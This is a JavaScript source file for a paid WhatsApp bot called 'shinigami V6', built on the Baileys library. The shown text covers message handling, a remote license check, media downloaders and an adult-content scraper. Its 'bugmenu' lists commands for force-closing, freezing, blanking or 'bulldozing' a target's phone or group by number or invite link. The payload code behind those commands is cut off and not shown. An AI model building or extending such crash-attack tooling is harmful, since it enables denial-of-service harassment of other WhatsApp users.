/*
#Baca!! 
- Riname Seperlunya Aja Biar Kagak Eror, Kalo Eror Tanggung Sendiri!! 
- Gk Usah Hapus Credits Kalo Mau Hapus Minimal Kasih Credits Di Tqto🤓
- Credits : Asepp ϟ Kelpin
~ No Sell No Send Ke Pt Lu Pake Buat Pribadi Aja Anjeng
~ Terima Kasih
*/

require('./config');
const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const util = require("util");
const moment = require("moment-timezone");
const path = require("path")
const os = require('os')
const vm = require('vm');
const sharp = require('sharp')
const pino = require('pino');
const didyoumean = require('didyoumean');
const similarity = require('similarity');
const figlet = require('figlet');
const gradient = require('gradient-string');
const readline = require("readline");
const logger = pino({ level: 'debug' });
const search = require("yt-search");
const { youtube } = require("btch-downloader");
const { Client } = require('ssh2');
const crypto = require('crypto');
const cheerio = require('cheerio');
const deniedCooldown = new Map();
const COOLDOWN = 5 * 60 * 1000;
const {
    spawn, 
    exec,
    execSync 
   } = require('child_process');
const { makeWASocket, makeCacheableSignalKeyStore, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, PHONENUMBER_MCC, AnyMessageContent, useMultiFileAuthState, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys')

module.exports = Asepp = async (Asepp, m, chatUpdate, store) => {
    try {
        const body = (
            m.mtype === "conversation" ? m.message.conversation :
            m.mtype === "imageMessage" ? m.message.imageMessage.caption :
            m.mtype === "videoMessage" ? m.message.videoMessage.caption :
            m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
            m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
            m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
            m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
            m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
            m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : "");
        const content = JSON.stringify(m.message)
        
        const isText = ["extendedTextMessage", "conversation"].includes(m.mtype)
		const isImage = ["imageMessage"].includes(m.mtype)
		const isVideo = ["videoMessage"].includes(m.mtype)
		const isSticker = ["stickerMessage"].includes(m.mtype)
		const isAudio = ["audioMessage"].includes(m.mtype) && !(m.message[m.mtype]?.ptt)
		const isVoice = ["audioMessage"].includes(m.mtype) && !!(m.message[m.mtype]?.ptt)
		const isViewOnce = ["viewOnceMessageV2", "viewOnceMessage"].includes(m.mtype)
		const isContact = ["contactMessage", "contactsArrayMessage"].includes(m.mtype)
		const isLocation = ["locationMessage"].includes(m.mtype)
		const isDocument = ["documentMessage", "documentWithCaptionMessage"].includes(m.mtype)
		const isProtocol = ["protocolMessage"].includes(m.mtype)
		const isPollUpdate = ["pollUpdateMessage"].includes(m.mtype)
		const isPollCreation = ["pollCreationMessage"].includes(m.mtype)
		const isButtonList = ["interactiveResponseMessage"].includes(m.mtype)
		const isButtonReply = ["templateButtonReplyMessage"].includes(m.mtype)
		const isAllMedia = ["imageMessage", "videoMessage", "stickerMessage", "audioMessage", "viewOnceMessageV2", "viewOnceMessage", "contactMessage", "contactsArrayMessage", "locationMessage", "documentMessage", "documentWithCaptionMessage"].includes(m.mtype)
		const isQuotedViewOnce = m.mtype === "extendedTextMessage" && content.includes("viewOnceMessage")
        
        const sender = m.key.fromMe ? Asepp.user.id.split(":")[0] + "@s.whatsapp.net" || Asepp.user.id
: m.key.participant || m.key.remoteJid;
        
        const senderNumber = sender.split('@')[0];
        const budy = (typeof m.text === 'string' ? m.text : '');
        const prefa = global.prefa
        const prefixRegex = /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/;
        const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : ''
        const from = m.key.remoteJid;
        const isGroup = from.endsWith("@g.us");
        const premium = JSON.parse(fs.readFileSync("./database/premium.json"))
        const reseller = JSON.parse(fs.readFileSync("./database/reseller.json"))
        const contacts = JSON.parse(fs.readFileSync("./database/ctcs.json"))
        const unli = JSON.parse(fs.readFileSync("./database/unli.json"))
        const OWNER_PATH = "./database/owner.json"
        const ownerbot = JSON.parse(fs.readFileSync(OWNER_PATH))
        const isOwner = ownerbot.includes(sender)
        const isUnli = unli.includes(m.chat)
        const botNumber = await Asepp.decodeJid(Asepp.user.id);
        const isPremium = premium.includes(m.sender)
        const isReseller = reseller.includes(m.sender)
        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const command2 = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1);
        const pushname = m.pushName || "No Name";
        const isCreator = [botNumber, ...ownerbot, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
        const text = q = args.join(" ");
        const quoted = m.quoted ? m.quoted : m;
        const mime = (quoted.msg || quoted).mimetype || '';
        const qmsg = (quoted.msg || quoted);
        const isMedia = /image|video|sticker|audio/.test(mime);
        const groupMetadata = isGroup ? await Asepp.groupMetadata(m.chat).catch((e) => {}) : "";
        const groupOwner = isGroup ? groupMetadata.owner : "";
        const groupName = m.isGroup ? groupMetadata.subject : "";
        const participants = isGroup ? await groupMetadata.participants : "";
        const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
        const groupMembers = isGroup ? groupMetadata.participants : "";
        const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
        const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
        const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
        const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;        
        const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins, capital } = require('./library/myfunction');
 
// Foto
const shinigami = fs.readFileSync('./image/AsepIkiCok.jpg')
const img = fs.readFileSync('./image/AsepIkicok.jpg')
const musik = fs.readFileSync('./image/sawit.mp3')

const {
    imageToWebp, 
    videoToWebp, 
    writeExifImg, 
    writeExifVid, 
    writeExif, 
    addExif 
} = require('./library/exif')      

// Database Maklu
const keamanan = 'https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/refs/heads/main/database/database.json';
let registeredBotNumbers = [];

async function loadBotDatabase() {
    try {
        const res = await axios.get(keamanan);
        registeredBotNumbers = Array.isArray(res.data.Numbers) ? res.data.Numbers : [];
    } catch (e) {
    }
}

function isBotNumberRegistered(botNumber) {
    const botNum = botNumber.split("@")[0];
    if (!Array.isArray(registeredBotNumbers)) return false;
    return registeredBotNumbers.includes(botNum);
}
if (!registeredBotNumbers.length) {
    await loadBotDatabase();
}

if (!Asepp.public && !isCreator) return;

if (m.message) {
    console.log(chalk.cyan.bold(`▢ New Message`));
    console.log(
        chalk.blue(
            `   ⌬ Tanggal: ${new Date().toLocaleString()} \n` +
            `   ⌬ Pesan: ${m.body || m.mtype} \n` +
            `   ⌬ Pengirim: ${pushname} \n` +
            `   ⌬ JID: ${senderNumber}`
        )
    );
    
    if (m.isGroup) {
        console.log(
            chalk.blue(
                `   ⌬ Grup: ${groupName} \n` +
                `   ⌬ GroupJid: ${m.chat}`
            )
        );
    }
    console.log();
}
async function tiktokDownloader(url) {
    try {
        const { data } = await axios.post(
            'https://www.tikwm.com/api/',
            `url=${encodeURIComponent(url)}&hd=1`,
            {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                timeout: 15000
            }
        )

        if (data.code !== 0) return null

        return {
            title: data.data.title,
            author: data.data.author?.unique_id,
            music: data.data.music_info?.title,
            cover: data.data.cover,
            no_watermark: data.data.play
        }

    } catch (e) {
        console.log('Scraper Error:', e.message)
        return null
    }
}
// Function
function getGreeting(hour) {
  if (hour >= 0 && hour < 5) return "Late Night 🌌";
  else if (hour >= 5 && hour < 10) return "Good Morning 🌅";
  else if (hour >= 10 && hour < 15) return "Good Noon 🩸️";
  else if (hour >= 15 && hour < 18) return "Good Afternoon 🌇";
  else if (hour >= 18 && hour < 19) return "Good Evening 🌆";
  else if (hour >= 19 && hour < 23) return "Good Night 🌃";
  else return "Midnight 🌌";
}

const nowJakarta = moment().tz('Asia/Jakarta');
const nowMakassar = moment().tz('Asia/Makassar');
const nowJayapura = moment().tz('Asia/Jayapura');
const hariIni = nowJakarta.format('dddd, DD MMMM YYYY');
const wib = nowJakarta.format('HH:mm:ss');
const wita = nowMakassar.format('HH:mm:ss');
const wit = nowJayapura.format('HH:mm:ss');   
const ucapanJakarta = getGreeting(parseInt(nowJakarta.format('HH')));
const ucapanMakassar = ucapanJakarta;
const ucapanJayapura = ucapanJakarta;

const example = (teks) => {
return `\n *Cara Penggunaan Command :*\n *${prefix+command}* ${teks}\n`
}
  
const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `Asepp`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=62895327469719:62895327469719\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}

const lol = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    liveLocationMessage: {
      degreesLatitude: -6.9175,
      degreesLongitude: 107.6191,
      caption: "𝐀𝐬𝐞𝐩𝐩\n𝐒𝐇𝐈𝐍𝐈𝐆𝐀𝐌𝐈 𝐕𝟔", 
      sequenceNumber: "1656662991",
      contextInfo: {
        forwardingScore: 999999,
        isForwarded: true
      }
    }
  }
}

// shinigami Eai
const Aseppbut = (anu) => {
const {message, key} = generateWAMessageFromContent(m.chat, {
  interactiveMessage: {
    body: {text: anu},
    footer: {text: `shinigami-Ai`},
    nativeFlowMessage: {
      buttons: [{text: "Asepp"}
           ],
    }
  },
}, {quoted: { key: { participant: '0@s.whatsapp.net', remoteJid: "0@s.whatsapp.net" }, message: { conversation: `shinigami - AI`}}})
 Asepp.relayMessage(m.chat, {viewOnceMessage:{message}}, {messageId:key.id})
}

// Fansen Nsfw
async function randomNsFw() {
			return new Promise((resolve, reject) => {
				const page = Math.floor(Math.random() * 1153)
				axios.get('https://sfmcompile.club/page/' + page).then((data) => {
					const $ = cheerio.load(data.data)
					const hasil = []
					$('#primary > div > div > ul > li > article').each(function (a, b) {
						hasil.push({
							title: $(b).find('header > h2').text(),
							link: $(b).find('header > h2 > a').attr('href'),
							category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
							share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
							views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
							type: $(b).find('source').attr('type') || 'image/jpeg',
							video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
							video_2: $(b).find('video > a').attr('href') || ''
						})
					})
					resolve(hasil)
				})
			})
		}

// Reply Text
// Reply Text
const payreply = async (teks) => {
  let mentionList = []
  let regex = /@?(\d{8,15})/g
  let match

  while ((match = regex.exec(teks)) !== null) {
    let number = match[1]
    let jid = number + "@s.whatsapp.net"
    mentionList.push(jid)
  }
  await Asepp.sendMessage(
    m.chat,
    {
      text: teks,
      contextInfo: {
        mentionedJid: mentionList,
        forwardingScore: 999999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: '120363418538598013@newsletter',
          serverMessageId: 145,
          newsletterName: '𝐈𝐤𝐢𝐀𝐬𝐞𝐩𝐋𝐨𝐡𝐉𝐢𝐫',
        },
        externalAdReply: {
          showAdAttribution: false,
          containsAutoReply: true,
          title: 'Asepp',
          body: 'shinigami V6',
          previewType: 'VIDEO',
          thumbnailUrl: 'https://img2.pixhost.to/images/7798/724632857_zedzbca3km.jpg',
          sourceUrl: 'https://whatsapp.com'
        }
      }
    },
    {
      quoted: {
        key: {
          fromMe: false,
          participant: '0@s.whatsapp.net',
          remoteJid: 'status@broadcast'
        },
        message: {
          conversation: '𝐒𝐇𝐈𝐍𝐈𝐆𝐀𝐌𝐈 𝐕𝟔'
        }
      }
    }
  )
}

async function replybug(teks, target) {
    let jid = (target || m.sender).split('@')[0]

    let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 999999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "120363418538598013@newsletter",
                            newsletterName: `𝐈𝐤𝐢𝐀𝐬𝐞𝐩𝐋𝐨𝐡𝐉𝐢𝐫`,
                            serverMessageId: 145
                        }
                    },
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: teks
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: `© Asepp`
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        title: ``,
                        subtitle: "",
                        hasMediaAttachment: true,
                        ...(await prepareWAMessageMedia({ image: { url: `https://img2.pixhost.to/images/7798/724632857_zedzbca3km.jpg` } }, { upload: Asepp.waUploadToServer })),
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                name: "cta_url",
                                buttonParamsJson: `{\"display_text\":\"Buy Script\",\"url\":\"https://wa.me/62881036109288\",\"merchant_url\":\"https://www.google.com\"}`
                            },
                            {
                                name: "cta_url",
                                buttonParamsJson: `{\"display_text\":\"Cek Target\",\"url\":\"https://wa.me/${jid}\",\"merchant_url\":\"https://www.google.com\"}`
                            }
                        ],
                    }),
                })
            }
        }
    }, { quoted: m })

    await Asepp.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    })
}

// Reply Text Bak Gb
async function replybug2(teks) {
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 999999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363418538598013@newsletter",
newsletterName: `𝐈𝐤𝐢𝐀𝐬𝐞𝐩𝐋𝐨𝐡𝐉𝐢𝐫`,
serverMessageId: 145
}
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `© Asepp`
}),
header: proto.Message.InteractiveMessage.Header.create({
  title: ``,
  subtitle: "",
  hasMediaAttachment: true,
  ...(await prepareWAMessageMedia(
    { image: { url: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1778782350519.jpeg" } },
    { upload: Asepp.waUploadToServer }
  )),
}),
gifPlayback: true,
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Developer Information\",\"url\":\"https://whatsapp.com/channel/0029VbBC3Qs29758iEaLcf1Y\",\"merchant_url\":\"https://www.google.com\"}`
}],
}), })}
}}, {quoted: lol})
await Asepp.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}

// Reply Database
async function replydebe(teks) {
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 999999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363418538598013@newsletter",
newsletterName: `𝐈𝐤𝐢𝐀𝐬𝐞𝐩𝐋𝐨𝐡𝐉𝐢𝐫`,
serverMessageId: 145
}
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `© Asepp`
}),
header: proto.Message.InteractiveMessage.Header.create({
  title: ``,
  subtitle: "",
  hasMediaAttachment: true,
  ...(await prepareWAMessageMedia(
    { image: { url: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1778782350519.jpeg" } },
    { upload: Asepp.waUploadToServer }
  )),
}),
gifPlayback: true,
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Buy Akses\",\"url\":\"https://wa.me/62881036109288\",\"merchant_url\":\"https://www.google.com\"}`
}],
}), })}
}}, {quoted: lol})
await Asepp.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}

async function safeReplyDebe(teks) {
    const now = Date.now();
    const last = deniedCooldown.get(m.sender) || 0;
    if (now - last > COOLDOWN) {
        deniedCooldown.set(m.sender, now);
        await replydebe(teks);
    }
}

// Ya Anu Pokoknya
const isBotRegisteredNow = isBotNumberRegistered(botNumber);

if (!isBotRegisteredNow) {
    const teksIlegal = `*⛔ ACCESS DENIED ⛔*

⚠️ *ERROR: UNAUTHORIZED EXECUTION*
Nomor bot ini tidak terdaftar dalam database shinigami V6.

『 𝐃𝐄𝐓𝐀𝐈𝐋 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 』
⌲ *Number:* ${botNumber.split('@')[0]}
⌲ *Status:* Unregistered ❌
⌲ *Reason:* Illegal Script Access

📌 HOW TO ACTIVATE
- Pastikan nomor bot kamu terdaftar di database resmi shinigami.
- Hubungi developer untuk melakukan pendaftaran atau membeli akses resmi.
- Jangan menggunakan cara ilegal, apalagi mencuri lewat panel ya😹.
- Setelah nomor bot terdaftar, restart bot agar perubahan berlaku.
- Gunakan bot sesuai aturan, jangan menyalahgunakan bot apalagi untuk merugikan orang lain yang tidak bersalah.`;

    await safeReplyDebe(teksIlegal);
    return;
}
    
switch (command) {
    case "start":
case "V6":
case "menu": {
    const nowJakarta = moment().tz('Asia/Jakarta');
    await Asepp.sendMessage(m.chat, { react: { text: "🩸", key: m.key } });

    let teks = `\`𝗦𝗛𝗜𝗡𝗜𝗚𝗔𝗠𝗜 𝗩𝟲 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡\`
    
Hi \`${pushname}\` 👋 ${getGreeting(parseInt(nowJakarta.format('HH')))} I'm shinigami, your WhatsApp assistant. I'm here to help you with various tasks and make things easier for you. Just send what you need and I'll do my best to assist you. ✨
       
⌲ \`𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 𝐁𝐎𝐓\`
┏━━━━━━━━━━━━━━━━
┃✦ *Name Bot  » shinigami*
┃✦ *Owner » Wahyu*
┃✦ *Developer » Asepp*
┃✦ *Version  » V6*
┃✦ *Language » JavaScript*
┃✦ *RunTime   » ${runtime(process.uptime())}*
┃✦ *Bot Mode » ${Asepp.public ? "Public" : "Self"}*
┃✦ TypeScript : *JavaScript*
┃✦ *StatusScript  » buyVip/buyer*
┗━━━━━━━━━━━━━━━━━━
⌲ \`𝐒𝐔𝐏𝐎𝐑𝐓 𝐒𝐂𝐑𝐈𝐏𝐓 \`
┏━━━━━━━━━━━━━━━━
┃☇ ditchi \`Friends\`
┃☇ Kelpin \`Freinds\`
┃☇ All Friend \`My Support\`
┃☇ Script users \`Thank You\`
┃☇ All Title shinigami \`Support\`
┃☇ All Parnert Asepp \`Support\`
┗━━━━━━━━━━━━━━━━━━
\`[洛] 𝐎𝐖𝐍𝐄𝐑 𝐒𝐎𝐒𝐌𝐄𝐃 [洛]\`
TikTok : tiktok.com/@asepppxyz
Telegram : t.me/AsepXxnx
`

    const msg = generateWAMessageFromContent(
        m.chat,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: ""
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: teks
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            hasMediaAttachment: true,
                            videoMessage: (
                                await prepareWAMessageMedia(
                                    { video: { url: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1778781640228.mp4" } }, // <-- GANTI URL VIDEO LU
                                    { upload: Asepp.waUploadToServer }
                                )
                            ).videoMessage,
                            gifPlayback: true // <-- KALO MAU MUTER OTOMATIS
                        }),
                        contextInfo: {
                            isForwarded: true,
                            forwardingScore: 999999,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: '120363418538598013@newsletter',
                                newsletterName: '𝐈𝐤𝐢𝐀𝐬𝐞𝐩𝐋𝐨𝐡𝐉𝐢𝐫',
                                serverMessageId: 145
                            }
                        },
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            messageParamsJson: JSON.stringify({
                                limited_time_offer: {
                                    text: "𝐒𝐇𝐈𝐍𝐈𝐆𝐀𝐌𝐈 𝐕𝟔",
                                    url: "https://t.me/AsepXxnx",
                                    copy_code: "𝐕𝟔",
                                    expiration_time: Date.now() * 999
                                },
                                bottom_sheet: {
                                    in_thread_buttons_limit: 2,
                                    divider_indices: [1, 2, 3, 4, 5],
                                    list_title: "CLICK",
                                    button_title: "© V6"
                                }
                            }),
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: JSON.stringify({
                                        title: "© V6",
                                        sections: [{
                                            title: "List Menu",
                                            highlight_label: "𝐓𝐨𝐩 𝐅𝐞𝐚𝐭𝐮𝐫𝐞 🚀",
                                            rows: [
                                                { title: "𝐀𝐥𝐥 𝐌𝐞𝐧𝐮", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑨𝒍𝒍 𝑨𝒗𝒂𝒊𝒍𝒂𝒃𝒍𝒆 𝑩𝒐𝒕 𝑪𝒐𝒎𝒂𝒏𝒅𝒔", id: ".allmenu" },
                                                { title: "𝐁𝐮𝐠 𝐌𝐞𝐧𝐮", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑩𝒖𝒈 𝑨𝒏𝒅 𝑪𝒓𝒂𝒔𝒉 𝑭𝒆𝒂𝒕𝒖𝒓𝒆𝒔", id: ".bugmenu" },
                                                { title: "𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑶𝒘𝒏𝒆𝒓 𝑩𝒐𝒕 𝑪𝒐𝒏𝒕𝒓𝒐𝒍 𝑭𝒆𝒂𝒕𝒖𝒓𝒆𝒔", id: ".ownermenu" },
                                                { title: "𝐅𝐮𝐧 𝐌𝐞𝐧𝐮", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑭𝒖𝒏 𝑨𝒏𝒅 𝑬𝒏𝒕𝒆𝒓𝒕𝒂𝒊𝒏𝒎𝒆𝒏𝒕 𝑭𝒆𝒂𝒕𝒖𝒓𝒆𝒔", id: ".funmenu" },
                                                { title: "𝐂𝐩𝐚𝐧𝐞𝐥 𝐌𝐞𝐧𝐮", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑪𝒑𝒂𝒏𝒆𝒍 𝑴𝒂𝒏𝒂𝒈𝒆𝒎𝒆𝒏𝒕 𝑭𝒆𝒂𝒕𝒖𝒓𝒆𝒔", id: ".cpanelmenu" },
                                                { title: "𝐍𝐬𝐟𝐰 𝐌𝐞𝐧𝐮", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝟏𝟖+ 𝑭𝒆𝒂𝒕𝒖𝒓𝒆𝒔", id: ".nsfwmenu" },
                                                { title: "𝐓𝐡𝐚𝐧𝐤𝐬 𝐓𝐨", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑻𝒉𝒆 𝑺𝒖𝒑𝒑𝒐𝒓𝒕 𝑳𝒊𝒔𝒕", id: ".tqto" },
                                                { title: "𝐒𝐜𝐫𝐢𝐩𝐭", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑺𝒄𝒓𝒊𝒑𝒕 𝑷𝒓𝒊𝒄𝒆", id: ".script" },
                                                { title: "𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑫𝒆𝒗𝒆𝒍𝒐𝒑𝒆𝒓 𝑪𝒐𝒏𝒕𝒂𝒄𝒕", id: ".owner" }
                                            ]
                                        }]
                                    })
                                }
                            ]
                        })
                    })
                }
            }
        },
        { quoted: lol }
    );

    await Asepp.relayMessage(m.chat, msg.message, { messageId: msg.key.id });

    await Asepp.sendMessage(
        m.chat,
        {
            audio: fs.readFileSync("./image/sawit.mp3"),
            mimetype: "audio/mp4",
            ptt: false
        },
        { quoted: qkontak }
    );
}
break;

case "bugmenu": {
    const nowJakarta = moment().tz('Asia/Jakarta');
    await Asepp.sendMessage(m.chat, { react: { text: "🩸", key: m.key } });

    let teks = `\`𝗦𝗛𝗜𝗡𝗜𝗚𝗔𝗠𝗜 𝗩𝟲 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡\`
    
Hi \`${pushname}\` 👋 ${getGreeting(parseInt(nowJakarta.format('HH')))} I'm shinigami, your WhatsApp assistant. I'm here to help you with various tasks and make things easier for you. Just send what you need and I'll do my best to assist you. ✨
    
⌲ \`𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 𝐁𝐎𝐓\`
┏━━━━━━━━━━━━━━━━
┃✦ *Name Bot  » shinigami*
┃✦ *Owner » Wahyu*
┃✦ *Developer » Asepp*
┃✦ *Version  » V6*
┃✦ *Language » JavaScript*
┃✦ *RunTime   » ${runtime(process.uptime())}*
┃✦ *Bot Mode » ${Asepp.public ? "Public" : "Self"}*
┃✦ TypeScript : *JavaScript*
┃✦ *StatusScript  » buyVip/buyer*
┗━━━━━━━━━━━━━━━━━━

\`[洛] 𝐏𝐑𝐈𝐕𝐀𝐓𝐄 𝐁𝐔𝐆 𝐒𝐇𝐈𝐍𝐈𝐆𝐀𝐌𝐈 [洛]\`

   \`[ 𝐅𝐎𝐑𝐂𝐋𝐎𝐒𝐄 𝐒𝐇𝐈𝐍𝐈𝐆𝐀𝐌𝐈 ]\`
→ .shinigami-fc 628xxx
→ .fc-invis 628xxx
→ .forclose-shinigami 628xxx

    \`[ 𝐃𝐄𝐋𝐀𝐘 𝐒𝐇𝐈𝐍𝐈𝐆𝐀𝐌𝐈 ]\`
→ .delay-god 628xxx
→ .delay-shinigami 628xxx
→ .delay-hard 628xxx
→ .delay-maker 628xxx

  \`[ 𝐃𝐄𝐋𝐀𝐘 𝐁𝐄𝐁𝐀𝐒 𝐒𝐏𝐀𝐌 ]\`
→ .vcxl 628xxx

   \`[ 𝐁𝐔𝐋𝐃𝐎𝐙𝐄𝐑 𝐒𝐇𝐈𝐍𝐈𝐆𝐀𝐌𝐈 ]\`
→ .shinigami-bulldozer 628xxx
→ .shinigami-attack 628xxx
→ .shinigami-bulldozerv2 628xxx

   \`[ 𝐔𝐈 𝐒𝐇𝐈𝐍𝐈𝐆𝐀𝐌𝐈 ]\`
→ .blank-one 628xxx
→ .blank-phone 628xxx
→ .blank-shinigami 628xxx
   
   \`[ 𝐈𝐎𝐒 𝐒𝐇𝐈𝐍𝐈𝐆𝐀𝐌𝐈 ]\`
→ .shinigami-ios 628xxx
→ .ios-attack 628xxx

\`[洛] 𝐓𝐄𝐒𝐅𝐔𝐍𝐓𝐈𝐎𝐍 [洛]\`
→ .testfunction

\`[洛] 𝐁𝐔𝐆 𝐆𝐑𝐎𝐔𝐏 [洛]\`
→ .shinigami-killgroup *Link Group*
→ .shinigami-blankgroup *Link Group*
`

    const msg = generateWAMessageFromContent(
        m.chat,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: ""
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: teks
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            hasMediaAttachment: true,
                            videoMessage: (
                                await prepareWAMessageMedia(
                                    { video: { url: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1778780066699.mp4" } },
                                    { upload: Asepp.waUploadToServer }
                                )
                            ).videoMessage,
